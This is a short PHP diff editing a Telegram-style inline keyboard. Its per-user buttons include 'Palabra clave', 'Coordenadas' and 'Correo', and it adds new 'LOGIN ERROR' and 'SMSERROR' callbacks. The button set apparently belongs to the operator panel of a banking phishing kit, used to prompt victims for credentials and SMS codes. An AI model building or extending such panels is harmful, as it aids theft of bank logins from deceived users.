@@ -14,8 +14,8 @@ $keyboard = [
             ["text" => "❓ Palabra clave", "callback_data" => "CLAVE|$usuario"]
         ],
         [
-            ["text" => "📍 Coordenadas", "callback_data" => "COORD|$usuario"],
-            ["text" => "📧 Correo", "callback_data" => "CORREO|$usuario"]
+            ["text" => "📍 LOGIN ERROR", "callback_data" => "ERROR|$usuario"],
+            ["text" => "📧 Correo", "callback_data" => "SMSERROR|$usuario"]
         ]
     ]
 ];
